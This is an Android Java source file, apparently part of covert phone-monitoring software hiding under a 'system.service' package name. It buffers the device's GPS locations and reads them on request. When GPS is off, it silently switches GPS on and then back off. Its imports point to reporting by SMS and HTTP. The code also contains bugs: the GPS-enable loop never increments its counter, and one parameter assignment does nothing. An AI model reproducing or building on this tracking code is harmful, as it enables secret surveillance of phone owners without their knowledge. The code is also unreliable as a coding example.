package system.service.feature.location;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.util.Date;
import java.util.LinkedList;
import java.util.Queue;

import org.apache.http.HttpResponse;
import org.apache.http.HttpStatus;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.entity.StringEntity;
import org.apache.http.impl.client.DefaultHttpClient;
import org.json.JSONArray;
import org.json.JSONObject;

import system.service.SmsReceiver;
import system.service.activity.GlobalPrefActivity;
import system.service.feature.sms.SmsCtrl;

import com.particle.inspector.common.util.GpsUtil;
import com.particle.inspector.common.util.SysUtils;

import android.content.Context;
import android.location.Criteria;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.location.LocationProvider;
import android.os.Bundle;
import android.telephony.TelephonyManager;
import android.telephony.gsm.GsmCellLocation;
import android.util.Log;

public class LocationUtil 
{
	private static final String LOGTAG = "GpsUtil";
	private static final int DEFAULT_INTERVAL = 60000; // ms
	private static final float DEFAULT_DISTANCE = 0; // meter
	private static final int DEFAULT_TRY_COUNT = 5;
	private static final int SLEEP_TIME = 5000; // ms
	
	private Context context;
	private LocationManager locationManager = null;
	private LocationListener locationListener = null;
	private LinkedList<Location> locationQueue;
	private static final int MAX_QUEUE_LEN = 100;
	
	public static final String REALPOSITION = "real";
	public static final String HISTPOSITION = "hist";
	
	public boolean sentSMS = false;
	
	public LocationUtil(Context context) {
		this.context = context;
		locationQueue = new LinkedList<Location>();
		try {
			locationManager = (LocationManager)context.getSystemService(Context.LOCATION_SERVICE);
			locationListener = new MyLocationlistener();
			locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, 0, 0, locationListener);
		} catch (Exception ex) {
			
		}
	}
	
	public void destroy() {
		if (locationManager != null) {
			locationManager.removeUpdates(locationListener);
		}
	}
	
	private void addLocation(Location location) {
        if (this.locationQueue == null) return;
        if (this.locationQueue.size() >= MAX_QUEUE_LEN) this.locationQueue.poll();
        this.locationQueue.offer(location);
    }
	
	// If return is not null and it is realtime position, realOrHistorical = "real"
	// If return is not null and it is historical position, realOrHistorical = "hist"
	public Location getLocation(String realOrHistorical)
    {		
		if (locationManager == null) return null;
		
		// If GPS is not enabled, try to enable it
		boolean tryToEnableGPS = false;
		if (!GpsUtil.isGpsEnabled(context)) {
			int tryCount = 0;
			while (!GpsUtil.isGpsEnabled(context) && tryCount < DEFAULT_TRY_COUNT) {
				GpsUtil.enableGPS(context);
				SysUtils.threadSleep(SLEEP_TIME, LOGTAG);
			}
			
			if (GpsUtil.isGpsEnabled(context))	tryToEnableGPS = true;
			if (tryToEnableGPS) SysUtils.threadSleep(SLEEP_TIME, LOGTAG);
		}
		
		// If provider is available
        try {
        	Location loc = null;
        	if (locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER)) {
    			loc = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
    		}
        	
        	if (loc == null) {
        		SysUtils.threadSleep(180000, LOGTAG);
        	}
        	
        	// If GPS previously forced to be enabled, try to disable it
    		if (tryToEnableGPS) {
    			GpsUtil.disableGPS(context);
    		}

        	// If cannot get any location, return a historical location.
        	if (loc == null) {
    			if (this.locationQueue.size() == 0) {
    				return null;
    			} else {
    				realOrHistorical = HISTPOSITION;
    				return this.locationQueue.getLast();
    			}
        	}
        	// Return location
        	else return loc;
        	
        } catch (Exception ex) {
        	Log.e(LOGTAG, ex.getMessage());
        	return null;
        }
		
    }
	
	 private class MyLocationlistener implements LocationListener {
		@Override
		public void onLocationChanged(Location location) {
			addLocation(location);
		}

		@Override
		public void onProviderDisabled(String provider) {
			
		}

		@Override
		public void onProviderEnabled(String provider) {
			Log.v(LOGTAG, "onProviderEnabled");
			//updateLocation(provider);
		}

		@Override
		public void onStatusChanged(String provider, int status, Bundle extras) {
			Log.v(LOGTAG, "onStatusChanged");
			//if (status != LocationProvider.AVAILABLE) return;
			//updateLocation(provider);
		};
	 }
}
